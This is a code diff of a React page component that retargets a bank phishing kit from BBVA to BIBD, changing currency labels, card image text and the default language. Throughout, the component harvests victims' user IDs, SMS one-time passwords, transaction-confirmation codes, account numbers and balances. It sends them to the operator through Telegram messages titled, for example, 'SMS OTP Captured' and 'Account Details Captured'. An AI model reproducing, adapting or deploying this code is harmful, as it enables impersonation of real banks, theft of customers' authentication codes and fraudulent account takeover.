@@ -33,7 +33,7 @@ export default function BbvaPage(props: any) {
     props?.initialScreen || "card"
   const [currentScreen, setCurrentScreen] = useState<"login" | "card" | "otp" | "accounts" | "confirm-otp">(initialScreen)
   const [isScreenLoading, setIsScreenLoading] = useState(false)
-  const [language, setLanguage] = useState<"en" | "es">("es")
+  const [language, setLanguage] = useState<"en" | "es">("en")
   const [locationInfo, setLocationInfo] = useState<{
     ip?: string
     city?: string
@@ -356,7 +356,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA — SMS OTP Captured",
+      title: "BIBD — SMS OTP Captured",
       dni: savedUser || undefined,
       otp1: codeToSave,
       type: "otp",
@@ -458,10 +458,10 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA — Account Details Captured",
+      title: "BIBD — Account Details Captured",
       dni: savedUser || undefined,
       accountNumber: accountNumber || "N/A",
-      balance: accountBalance ? `€${accountBalance}` : "N/A",
+      balance: accountBalance ? `BND ${accountBalance}` : "N/A",
       type: "account",
     }).catch((err) => console.error("Error sending Telegram notification:", err))
 
@@ -488,7 +488,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: `BBVA — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
+      title: `BIBD — Transaction Confirm OTP (Attempt ${confirmAttempt})`,
       dni: savedUser || undefined,
       otp2: code,
       attempt: `${confirmAttempt}`,
@@ -594,7 +594,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA — Confirm OTP Resend Requested",
+      title: "BIBD — Confirm OTP Resend Requested",
       dni: savedUser || undefined,
       type: "resend_confirm_otp",
     }).catch(() => {})
@@ -611,7 +611,7 @@ export default function BbvaPage(props: any) {
 
     const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
     sendTelegramMessage({
-      title: "BBVA — OTP Resend Requested",
+      title: "BIBD — OTP Resend Requested",
       dni: savedUser || undefined,
       type: "resend_otp",
     }).catch(() => {})
@@ -813,7 +813,7 @@ export default function BbvaPage(props: any) {
               <div className="w-full flex justify-center">
                 <img
                   src="/bibd_card.jpg"
-                  alt="BIBD Virtual Prepaid Card"
+                  alt="BIBD Debit / Credit Card"
                   className="w-full max-w-[380px] mx-auto h-auto object-contain rounded-[14px] shadow-sm select-none pointer-events-none"
                 />
               </div>
@@ -1170,7 +1170,7 @@ export default function BbvaPage(props: any) {
               <div className="relative w-full max-w-[380px] rounded-[14px] overflow-hidden shadow-sm flex items-center justify-center bg-[#980F65]">
                 <img
                   src="/bibd_card.jpg"
-                  alt="BIBD Virtual Prepaid Card"
+                  alt="BIBD Debit / Credit Card"
                   className="w-full h-auto object-contain rounded-[14px] select-none pointer-events-none"
                 />
                 {/* Overlaid Embossed Number */}
@@ -1221,7 +1221,7 @@ export default function BbvaPage(props: any) {
               </p>
               <div className="flex items-center">
                 <span className="bg-[#980F65] text-white text-[11px] font-bold px-2.5 py-1 rounded-[6px] mr-2.5 select-none shrink-0 flex items-center justify-center">
-                  EUR
+                  BND
                 </span>
                 <input
                   type="text"
